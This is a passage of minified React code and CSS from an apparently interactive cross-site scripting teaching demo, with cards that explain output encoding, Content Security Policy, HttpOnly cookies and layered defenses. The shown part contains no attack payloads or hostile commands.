log"}),e.jsx("div",{className:"xss-events-body",children:a.events.slice(-8).map(_=>e.jsxs("div",{className:"xss-event",children:[e.jsxs("span",{className:"xss-event-num",children:["#",_.seq]}),e.jsx("span",{className:"xss-event-text",children:_.text})]},_.seq))})]}),e.jsxs("div",{className:"xss-teach",children:[e.jsxs("div",{className:"xss-teach-col",style:{borderLeftColor:We},children:[e.jsx("div",{className:"xss-teach-title",children:"Output encoding"}),e.jsxs("div",{className:"xss-teach-body",children:["Escape untrusted values at ",e.jsx("strong",{children:"render time"}),": ",e.jsx("code",{children:"<"})," → ",e.jsx("code",{children:"&lt;"}),".",e.jsxs("div",{className:"xss-teach-sub",children:[e.jsx("strong",{children:"Catches:"})," reflected + stored XSS."," ",e.jsx("strong",{children:"Misses:"})," DOM-based sinks (innerHTML, document.write) — they live in the client, after the server is done encoding."]})]})]}),e.jsxs("div",{className:"xss-teach-col",style:{borderLeftColor:bt},children:[e.jsx("div",{className:"xss-teach-title",children:"CSP: script-src 'self'"}),e.jsxs("div",{className:"xss-teach-body",children:["Browser refuses inline ",e.jsx("code",{children:"<script>"})," and third-party script sources.",e.jsxs("div",{className:"xss-teach-sub",children:[e.jsx("strong",{children:"Catches:"})," all three variants — even if an encoding bug slips through. ",e.jsx("strong",{children:"Cost:"})," requires a nonce/hash discipline for legitimate inline scripts; breaks sloppy third-party embeds."]})]})]}),e.jsxs("div",{className:"xss-teach-col",style:{borderLeftColor:fr},children:[e.jsx("div",{className:"xss-teach-title",children:"HttpOnly cookies"}),e.jsxs("div",{className:"xss-teach-body",children:[e.jsx("code",{children:"document.cookie"})," cannot read the session cookie.",e.jsxs("div",{className:"xss-teach-sub",children:[e.jsx("strong",{children:"Catches:"})," cookie theft even if XSS succeeds. ",e.jsx("strong",{children:"Misses:"})," in-page phishing, CSRF-style actions, keylogging — the attacker can still do anything the logged-in user can do in the tab."]})]})]}),e.jsxs("div",{className:"xss-teach-col",style:{borderLeftColor:vt},children:[e.jsx("div",{className:"xss-teach-title",children:"Defense in depth"}),e.jsxs("div",{className:"xss-teach-body",children:["Stack them: encoding at every render, strict CSP with nonces, HttpOnly+Secure+SameSite cookies, safe-sink libraries (DOMPurify, Trusted Types) for client-side HTML.",e.jsxs("div",{className:"xss-teach-sub",children:["Do not trust input, but ",e.jsx("strong",{children:"protect at render"}),". Each layer alone has gaps; together they cover the common attack surface."]})]})]})]})]})]})}
function Hu(n,t,s,r){const o=r?s:t;if(!o)return n;const i=n.indexOf(o);if(i<0)return n;const a=n.slice(0,i),l=n.slice(i+o.length);return e.jsxs(e.Fragment,{children:[a,e.jsx("span",{className:r?"xss-hl xss-hl-safe":"xss-hl xss-hl-bad",children:o}),l]})}
const Ku=`
.xss-root {
  color: ${be};
  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
  padding: 16px;
  background: ${De};
}
.xss-panel {
  background: ${po};
  border: 1px solid ${Re};
  border-radius: 10px;
  padding: 16px 18px;
  max-width: 1280px;
  margin: 0 auto;
}
.xss-title-row {
  display: flex;
  justify-content: space-between;
  align-items: flex-start;
  gap: 12px;
  padding-bottom: 12px;
  border-bottom: 1px solid ${Re};
  flex-wrap: wrap;
}
.xss-title {
  font-size: 18px;
  font-weight: 600;
  color: ${be};
}
.xss-subtitle {
  font-size: 12px;
  color: ${$e};
  margin-top: 2px;
}
.xss-title-controls {
  display: flex;
  gap: 10px;
  align-items: center;
  flex-wrap: wrap;
}
.xss-label {
  color: ${$e};
  font-size: 13px;
  display: inline-flex;
  align-items: center;
}
.xss-label select {
  background: ${De};
  border: 1px solid ${Re};
  color: ${be};
  padding: 4px 6px;
  border-radius: 4px;
  font-size: 13px;
}
.xss-toggle {
  display: inline-flex;
  background: ${De};
  border: 1px solid ${Re};
  border-radius: 5px;
  overflow: hidden;
}
.xss-toggle-opt {
  padding: 5px 12px;
  border: none;
  font-size: 12px;
  cursor: pointer;
  font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
  font-weight: 600;
  text-transform: lowercase;
  transition: filter 0.15s;
}
.xss-toggle-opt:hover { filter: brightness(1.2); }

.xss-btn {
  padding: 6px 12px;
  background: ${bt};
  border: none;
  border-radius: 5px;
  color: white;
  font-weight: 600;
  cursor: pointer;
  font-size: 12px;
  transition: filter 0.15s;
}
.xss-btn:disabled { opacity: 0.4; cursor: not-allowed; }
.xss-btn:not(:disabled):hover { filter: brightness(1.15); }
.xss-btn-ghost {
  background: transparent;
  border: 1px solid ${Re};
  color: ${be};
}
.xss-btn-attack {
  background: ${vt};
  color: ${De};
  font-weight: 700;
}
.xss-btn-victim {
  background: ${We};
  color: ${De};
  font-weight: 700;
}

.xss-scenario-desc {
  background: ${De};
  border: 1px solid ${Re};
  border-left: 3px solid ${bt};
  border-radius: 6px;
  padding: 8px 12px;
  font-size: 12px;
  color: ${be};
  margin: 12px 0;
  line-height: 1.55;
}
.xss-scenario-desc strong { font-size: 12.5px; }

.xss-defense-bar {
  display: flex;
  flex-wrap: wrap;
  align-items: center;
  gap: 8px;
  padding: 8px 0 12px 0;
  border-bottom: 1px solid ${Re};
  margin-bottom: 12px;
}
.xss-defense-pill {
  display: inline-flex;
  align-items: center;
  gap: 6px;
  padding: 5px 10px;
  background: ${De};
  border: 1px solid ${Re};
  color: ${$e};
  border-radius: 20px;
  font-size: 11.5px;
  cursor: pointer;
  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
  transition: border-color 0.15s, background 0.15s, color 0.15s;
}
.xss-defense-pill:hover { border-color: ${bt}; }
.xss-defense-pill.on {
  background: ${We}22;
  border-color: ${We};
  color: ${be};
}
.xss-defense-dot {
  width: 7px; height: 7px; border-radius: 50%;
  background: ${$e};
}
.xss-defense-pill.on .xss-defense-dot { background: ${We}; box-shadow: 0 0 6px ${We}; }
.xss-defense-state {
  font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
  font-size: 10px;
  color: ${$e};
  text-transform: uppercase;
  letter-spacing: 0.5px;
}
.xss-defense-pill.on .xss-defense-state { color: ${We}; }
.xss-defense-summary {
  margin-left: auto;
  font-size: 11px;
  color: ${$e};
  font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
}
.xss-defense-summary strong { color: ${be}; }

/* 3 actor columns */
.xss-columns {
  display: grid;
  grid-template-columns: 1fr 1.15fr 1.1fr;
  gap: 12px;
}
.xss-col {
  background: ${De};
  border: 1px solid ${Re};
  border-radius: 8px;
  padding: 10px 12px;
  min-height: 420px;
  display: flex;
  flex-direction: column;
  gap: 10px;
}
.xss-col-title {
  font-size: 13px;
  font-weight: 700;
  color: ${be};
  display: flex;
  align-items: center;
}
.xss-col-sub {
  font-size: 11px;
  color: ${$e};
  margin-top: -6px;
}
.xss-variant-pill {
  padding: 2px 8px;
  border-radius: 10px;
  font-size: 10px;
  font-weight: 700;
  font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
  text-transform: lowercase;
}

.xss-block {
  background: ${po};
  border: 1px solid ${Re};
  border-radius: 6px;
  padding: 8px 10px;
  display: flex;
  flex-direction: column;
  gap: 6px;
}
.xss-block-hd {
  font-size: 10px;
  color: ${$e};
  text-transform: uppercase;
  letter-spacing: 0.5px;
  display: flex;
  gap: 6px;
  align-items: center;
  flex-wrap: wrap;
}
.xss-block[data-flash] { animation: xss-pulse 1.2s ease-in-out; }
@keyframes xss-pulse {
  0% { box-shadow: 0 0 0 0 ${bt}88; }
  100% { box-shadow: 0 0 0 0 ${bt}00; }
}

.xss-payload-label {
  font-size: 12px;
  font-weight: 700;
  color: ${be};
  display: flex;
  gap: 6px;
  align-items: center;
}
.xss-payload-intent {
  font-size: 11px;
  color: ${$e};
  font-style: italic;
}
.xss-tag {
  font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
  font-size: 9.5px;
  padding: 1px 6px;
  border-radius: 8px;
  text-transform: lowercase;
  letter-spacing: 0.3px;
}
.xss-tag.danger { background: ${vt}33; color: ${vt}; }
.xss-tag.warn   { background: ${fr}33;   color: ${fr}; }
.xss-tag.good   { background: ${We}33;   color: ${We}; }

.xss-code {
  font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
  background: ${De};
  border: 1px solid ${Re};
  border-radius: 4px;
  padding: 6px 8px;
  font-size: 11px;
  color: ${be};
  margin: 0;
  overflow-x: auto;
  white-space: pre;
  line-height: 1.5;
}
.xss-code-wrap { white-space: pre-wrap; word-break: break-all; }
.xss-code-small { font-size: 10.5px; }

.xss-mini {
  font-size: 10.5px;
  color: ${$e};
  font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
}

.xss-empty {
  font-size: 11px;
  color: ${$e};
  font-style: italic;
  font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
}

.xss-db {
  display: flex;
  flex-direction: column;
  gap: 2px;
  font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
  font-size: 10.5px;
}
.xss-db-row {
  display: flex;
  gap: 6px;
  padding: 3px 0;
  border-bottom: 1px dashed ${Re};
  color: ${be};
}
.xss-db-id { color: ${$e}; }
.xss-db-author { color: ${fr}; }
.xss-db-body { color: ${vt}; word-break: break-all; }

.xss-pipeline {
  font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
  font-size: 11px;
  color: ${be};
  background: ${De};
  border: 1px dashed ${Re};
  padding: 6px 8px;
  border-radius: 4px;
  line-height: 1.55;
}
.xss-pipeline b { color: ${fr}; }

.xss-outcome {
  display: flex;
  flex-direction: column;
  gap: 4px;
  font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
  font-size: 12px;
}
.xss-outcome-row {
  display: flex;
  justify-content: space-between;
  gap: 10px;
}
.xss-outcome-k { color: ${$e}; }
.xss-outcome-v { font-weight: 700; }
.xss-mono-sm { font-size: 11px; color: ${be}; }

.xss-hl {
  padding: 1px 2px;
  border-radius: 2px;
}
.xss-hl-bad { background: ${vt}33; color: ${vt}; font-weight: 700; }
.xss-hl-safe { background: ${We}33; color: ${We}; }

.xss-status {
  display: flex;
  align-items: center;
  gap: 8px;
  margin-top: 12px;
  padding: 8px 12px;
  background: ${De};
  border-left: 3px solid ${bt};
  border-radius: 4px;
  font-size: 12px;
  color: ${be};
  font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
  line-height: 1.5;
}
.xss-status-dot {
  width: 8px;
  height: 8px;
  border-radius: 50%;
  flex-shrink: 0;
}

.xss-events {
  margin-top: 10px;
  background: ${De};
  border: 1px solid ${Re};
  border-radius: 6px;
  padding: 8px 10px;
}
.xss-events-hd {
  font-size: 10px;
  color: ${$e};
  text-transform: uppercase;
  letter-spacing: 0.5px;
  margin-bottom: 4px;
}
.xss-events-body {
  display: flex;
  flex-direction: column;
  gap: 2px;
  max-height: 140px;
  overflow-y: auto;
  font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
  font-size: 11px;
}
.xss-event {
  display: flex;
  gap: 8px;
  color: ${be};
  padding: 1px 0;
  border-bottom: 1px dashed ${Re};
}
.xss-event:last-child { border-bottom: none; }
.xss-event-num { color: ${$e}; flex-shrink: 0; width: 28px; }
.xss-event-text { flex: 1; }

/* teaching cards */
.xss-teach {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
  gap: 10px;
  margin-top: 14px;
}
.xss-teach-col {
  background: ${De};
  border: 1px solid ${Re};
  border-left: 3px solid ${bt};
  border-radius: 5px;
  padding: 9px 12px;
}
.xss-teach-title {
  font-size: 13px;
  font-weight: 700;
  color: ${be};
  margin-bottom: 5px;
}
.xss-teach-body {
  font-size: 11px;
  color: ${$e};
  line-height: 1.6;
}
.xss-teach-body strong { color: ${be}; }
.xss-teach-body code {
  font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
  font-size: 10.5px;
  background: ${po};
  border: 1px solid ${Re};
  padding: 0 4px;
  border-radius: 3px;
  color: ${be};
}
.xss-teach-sub {
  margin-top: 4px;
  font-size: 11px;
  color: ${$e};
}

@media (max-width: 960px) {
  .xss-columns { grid-template-columns: 1fr; }
}
`;

export default Bu;
export { Bu as Component };
export function mount(container) {
  const el = typeof container === 'string' ? document.querySelector(container) : container;
  if (!el) throw new Error("Mount target not found: " + container);
  const root = ReactDOM.createRoot(el);
  root.render(e.jsx(Bu, {}));
  return () => root.unmount();
}
